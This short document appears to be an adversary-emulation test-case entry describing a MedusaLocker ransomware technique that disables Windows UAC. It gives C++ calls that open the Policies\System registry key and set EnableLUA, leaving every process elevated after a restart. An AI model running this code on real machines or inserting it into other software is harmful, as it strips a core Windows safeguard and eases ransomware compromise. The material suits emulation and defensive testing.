This TTP is used to disable UAC in the victim system and has been extracted from MedusaLocker Ransomware. It modifies registry keys to disable UAC. It requires **Admin privileges** and **Restart** to completely disable the UAC on the system. Once the testcase has successfully been executed, every process will open as admin by default.

#### Open the registry key
```c++
RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
```
#### Change the value
```c++
RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
```
